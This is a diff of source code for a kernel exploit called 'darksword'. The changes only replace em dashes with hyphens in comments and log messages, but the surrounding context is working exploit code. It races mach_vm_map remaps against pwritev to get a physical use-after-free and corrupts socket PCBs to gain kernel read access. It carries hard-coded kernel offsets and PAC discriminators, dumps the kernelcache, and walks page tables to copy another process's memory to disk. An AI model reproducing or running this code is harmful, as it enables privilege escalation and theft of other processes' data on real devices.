@@ -180,7 +180,7 @@ volatile memory_object_offset_t targetObjectOffset = 0;
 void darksword_cancel(void) {
     darksword_cancelled = 1;
     goSync = 0;
-    // Don't touch raceSync here — the spin loops check darksword_cancelled directly
+    // Don't touch raceSync here - the spin loops check darksword_cancelled directly
 }
 
 NSMutableDictionary<NSNumber *, id> *gMlockDict;
@@ -271,7 +271,7 @@ void *free_thread(void *arg)
 		if (darksword_cancelled) return NULL;
 
 		// Single atomic remap (FIXED|OVERWRITE), matching the reference exploit.
-		// Using mach_vm_map (64-bit API) with OVERWRITE — NOT vm_deallocate+vm_map,
+		// Using mach_vm_map (64-bit API) with OVERWRITE - NOT vm_deallocate+vm_map,
 		// which opened a slower unmapped window and used the 32-bit vm_map.
 		mach_vm_address_t ft = freeTarget;
 		kern_return_t kr = mach_vm_map(mach_task_self(),
@@ -469,7 +469,7 @@ kern_return_t physical_oob_read_mo(mach_port_t memoryObject, mach_vm_offset_t me
 			FAILURE(0);
 		}
 		// pwritev returns -1 (EFAULT) when the copyin faulted on the remapped
-		// page — that's the signal the race landed. Read the file back; if the
+		// page - that's the signal the race landed. Read the file back; if the
 		// marker changed, we captured targetObject's physical contents.
 		if (w == -1) {
 			pread(readFd, buffer, size, 0x3f00 + offset);
@@ -708,7 +708,7 @@ void pe_v1(void)
 			// Fill every page with randomMarker. This is the sentinel: after the
 			// race lands, a page still ours reads back randomMarker, while a page
 			// reclaimed by the kernel as a socket inpcb reads back kernel data
-			// (!= randomMarker) — which is how we detect a usable PUAF page.
+			// (!= randomMarker) - which is how we detect a usable PUAF page.
 			for (uint64_t k = 0; k < searchMappingSize; k += PAGE_SIZE) {
 				*(uint64_t *)(searchMappingAddress + k) = randomMarker;
 			}
@@ -853,7 +853,7 @@ int darksword_succeeded(void)
 #define OFF_P_LIST_LE_NEXT 0x00   // proc.p_list.le_next  (LIST_ENTRY at proc+0)
 #define OFF_P_LIST_LE_PREV 0x08   // proc.p_list.le_prev
 #define OFF_P_PID          0x60   // proc.p_pid
-// kernproc pointer offset from kernel_base — CANDIDATE from 21R360/10.0.1 (the
+// kernproc pointer offset from kernel_base - CANDIDATE from 21R360/10.0.1 (the
 // nearest available kernelcache); validated at runtime, with a windowed scan
 // fallback if it drifted on 10.6.1.
 #define KERNPROC_OFF_CANDIDATE 0x7c62e8ULL
@@ -917,7 +917,7 @@ static bool ds_proc_has_name(uint64_t proc, const char *needle)
 // Locate kernproc: try the candidate offset, else scan a window around it.
 // Find the heap pointer that repeats most across buf. On a page full of sprayed
 // kqueues, that's kq_p == current_proc (identical in every kqueue). No struct
-// offsets needed — purely the repeating-value signature.
+// offsets needed - purely the repeating-value signature.
 static uint64_t ds_find_repeating_kptr(const uint8_t *buf, size_t len)
 {
 	uint64_t best = 0;
@@ -1034,10 +1034,10 @@ static char gLastDumpPath[256] = {0};   // path of last successful process dump 
 
 // Return how much of the kernelcache is safe to dump contiguously from
 // kernel_base. The tail segments (__PRELINK_INFO / __LINKEDIT) are freed/unmapped
-// after boot — reading into them panics. __TEXT_EXEC is the last always-mapped
+// after boot - reading into them panics. __TEXT_EXEC is the last always-mapped
 // segment before that gap and holds all the code we need to disassemble, so we
 // clamp the dump to its end (covers __TEXT, __PRELINK_TEXT, __DATA_CONST,
-// __TEXT_EXEC — all contiguous and mapped).
+// __TEXT_EXEC - all contiguous and mapped).
 static uint64_t ds_kernelcache_size(void)
 {
 	uint8_t hdr[0x20];
@@ -1099,13 +1099,13 @@ void peepo_dump_kernelcache(void)
 
 // ---- page-table walk: read another process's user memory --------------------
 // pmap layout (kfd static_info): tte@0x0 (virtual root TT), ttep@0x8 (physical
-// root TT) — both unsigned in struct pmap. 16KB pages on T8006.
+// root TT) - both unsigned in struct pmap. 16KB pages on T8006.
 #define OFF_PMAP_TTE    0x0
 #define OFF_PMAP_TTEP   0x8
 // vm_map->pmap: validated against the EXACT 10.6.1 kernelcache dump (2026-06-19).
 // offsetof(_vm_map,pmap)= lck_rw_t(0x10) + vm_map_header(0x30) = 0x40. The field is
 // XNU_PTRAUTH_SIGNED_PTR("_vm_map.pmap"); clang discriminator = 0x250c (NOT 0x2fef).
-// 164 kernel sites auth a +0x40 load with movk #0x250c — the canonical map->pmap
+// 164 kernel sites auth a +0x40 load with movk #0x250c - the canonical map->pmap
 // codegen `ldr x16,[map,#0x40]!; mov x17,map; movk x17,#0x250c,lsl#48; autda`.
 // (The old 0x558/disc-0x2fef was a misattributed different signed field.)
 #define OFF_VM_MAP_PMAP 0x40    // vm_map->pmap (PAC-signed data-key-A, disc 0x250c)
@@ -1132,7 +1132,7 @@ static bool ds_setup_physmap(uint64_t pmap)
 	uint64_t ttep = early_kread64(pmap + OFF_PMAP_TTEP);
 	printf("[pt] pmap=%#llx tte=%#llx ttep=%#llx\n", pmap, tte, ttep);
 	// tte = L1 root KVA (8 entries, 64-byte aligned); ttep = its physical. Slide is
-	// 16KB-aligned. (Root is L1, NOT 16KB-aligned — don't require page alignment.)
+	// 16KB-aligned. (Root is L1, NOT 16KB-aligned - don't require page alignment.)
 	if (!ds_kptr_derefable(tte) || ttep == 0 || ttep >= 0x1000000000ULL || tte <= ttep ||
 	    (tte & 0x3f) != 0 || (ttep & 0x3f) != 0 || ((tte - ttep) & 0x3fff) != 0) {
 		printf("[pt] implausible tte/ttep\n");
@@ -1149,7 +1149,7 @@ static bool ds_setup_physmap(uint64_t pmap)
 // DRAM physical window (T8006). Only physical addresses here are covered by the
 // physmap; reading device/MMIO/reserved physical through it panics.
 // Readable physmap window. The low ~0x7MB of DRAM (0x8_00000000..gPhysBase) is a
-// reserved carveout (iBoot/SEP/TZ) NOT in the physmap — reading it panics. From
+// reserved carveout (iBoot/SEP/TZ) NOT in the physmap - reading it panics. From
 // live traces: pages at 0x801../0x802.. panic; gPhysBase <= 0x806e68cc0 (read OK).
 // 0x807000000 is safely >= gPhysBase and below every observed-good page. HI = 1GB
 // (S4 has no DRAM above 0x8_40000000). TODO: read exact gPhysBase/gPhysSize for full coverage.
@@ -1217,7 +1217,7 @@ void peepo_dump_process(uint64_t proc, const char *name)
 	if (!base[0]) snprintf(base, sizeof(base), "proc");
 
 	// DUMP_DEBUG=1: mirror every step to Documents/dumpdbg.log (F_FULLFSYNC'd so it
-	// survives a panic) + the first 24 PT-walk translations — used to diagnose panics.
+	// survives a panic) + the first 24 PT-walk translations - used to diagnose panics.
 	// DUMP_DEBUG=0 (default): console-only, no file/fsync, for lean/fast dumps.
 	NSString *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
 #if DUMP_DEBUG
@@ -1250,12 +1250,12 @@ void peepo_dump_process(uint64_t proc, const char *name)
 	uint64_t tte = early_kread64(pmap + OFF_PMAP_TTE), ttep = early_kread64(pmap + OFF_PMAP_TTEP);
 	DLOG("[dump] target tte=%#llx ttep=%#llx (its slide %#llx)\n", tte, ttep, tte - ttep);
 	if (!ds_kptr_derefable(tte)) DABORT("target tte (root) not derefable");
-	// The physmap slide is GLOBAL — derive it from OUR own validated process, not the
+	// The physmap slide is GLOBAL - derive it from OUR own validated process, not the
 	// target (a target's ttep can be inconsistent / not the real root physical). The
 	// walk then uses the target's tte (root KVA) + this global slide.
 	uint64_t self_pmap = gCurrentProc ? ds_pmap_of(gCurrentProc) : pmap;
 	if (!ds_kptr_derefable(self_pmap) || !ds_setup_physmap(self_pmap)) DABORT("global physmap setup failed");
-	DLOG("[dump] GLOBAL physoff=%#llx — opening bin\n", gPhysmapOff);
+	DLOG("[dump] GLOBAL physoff=%#llx - opening bin\n", gPhysmapOff);
 
 	NSString *path = [docs stringByAppendingPathComponent:[NSString stringWithFormat:@"%s_%u.bin", base, pid]];
 	FILE *f = fopen(path.UTF8String, "wb");
@@ -1280,8 +1280,8 @@ void peepo_dump_process(uint64_t proc, const char *name)
 			DLOG("[dump] region %d: %#llx-%#llx (%llu KB)\n", nregions, start, end, (end-start) >> 10);
 			for (uint64_t va = start & ~DS_PAGE_MASK; va < end && total < CAP && !darksword_cancelled; va += DS_PAGE_SZ) {
 				uint64_t pa = ds_va_to_phys(pmap, va);   // table reads are gated/guarded inside
-				if (!pa) continue;                       // unmapped — skip (silent)
-				if (pa < DS_DRAM_LO || pa >= DS_DRAM_HI) continue;   // outside readable physmap — skip
+				if (!pa) continue;                       // unmapped - skip (silent)
+				if (pa < DS_DRAM_LO || pa >= DS_DRAM_HI) continue;   // outside readable physmap - skip
 				ds_kreadbuf(pa + gPhysmapOff, page, DS_PAGE_SZ);
 				fwrite(&va, sizeof(va), 1, f);
 				fwrite(page, 1, DS_PAGE_SZ, f);
@@ -1397,7 +1397,7 @@ void darksword_run(void)
 	// DATASWORD) would race two exploit threads over the same sockets/race
 	// machinery and panic the kernel instantly. Only ever allow one.
 	if (__sync_lock_test_and_set(&darksword_running, 1)) {
-		printf("[!] darksword already running — ignoring duplicate launch\n");
+		printf("[!] darksword already running - ignoring duplicate launch\n");
 		return;
 	}
 
@@ -1438,16 +1438,16 @@ void darksword_run(void)
 
 		printf("=== [STEP 3/7] pe_init (files + race thread) ===\n");
 		pe_init();
-		printf("[+] pe_init done — readFd=%d writeFd=%d\n", readFd, writeFd);
+		printf("[+] pe_init done - readFd=%d writeFd=%d\n", readFd, writeFd);
 		sleep(2);
 
 		printf("=== [STEP 4/7] physical OOB r/w + PCB corrupt ===\n");
 		pe_v1();
-		printf("[+] pe done — highestSuccessIdx=%d successReadCount=%d\n",
+		printf("[+] pe done - highestSuccessIdx=%d successReadCount=%d\n",
 		       highestSuccessIdx, successReadCount);
 
 		if (darksword_cancelled || rwSocketPcb == 0) {
-			printf("[!] run cancelled or pe_v1 did not complete — unwinding\n");
+			printf("[!] run cancelled or pe_v1 did not complete - unwinding\n");
 			goSync = 0;
 			raceSync = 1;
 			if (free_thread_needs_join) {
@@ -1461,10 +1461,10 @@ void darksword_run(void)
 		}
 		sleep(2);
 
-		// Offset-free current_proc leak — MUST run while the race (freeThread)
+		// Offset-free current_proc leak - MUST run while the race (freeThread)
 		// is still alive, since it uses physical_oob_read_mo. The leak's reclaim
 		// race is the unstable part (intermittent panic), and it's only needed
-		// for PROCS/probe — NOT for the kernelcache dump. Skip it when we just
+		// for PROCS/probe - NOT for the kernelcache dump. Skip it when we just
 		// want a stable path to WIN + DUMP.
 		if (gWantCurrentProc) {
 			printf("=== [STEP 4.5/7] leak current_proc (kqueue reclaim) ===\n");
@@ -1502,7 +1502,7 @@ void darksword_run(void)
 		uint64_t protoPtr  = early_kread64(socketPtr + OFFSET_SO_PROTO);
 		uint64_t rawTextPtr = early_kread64(protoPtr + OFFSET_PR_INPUT);
 		// pr_input is a PAC-signed pointer; the auth code occupies the top 32 bits
-		// (bits [63:32]) — confirmed across runs where bits[39:32] varied (0xf0 vs
+		// (bits [63:32]) - confirmed across runs where bits[39:32] varied (0xf0 vs
 		// 0x70), so they are PAC, not address. The real kernel text address is the
 		// low 32 bits. __xpaci is a no-op on this target, so strip by re-applying
 		// the kernel-text VA prefix (0xfffffff0_00000000) taken from protoPtr, which
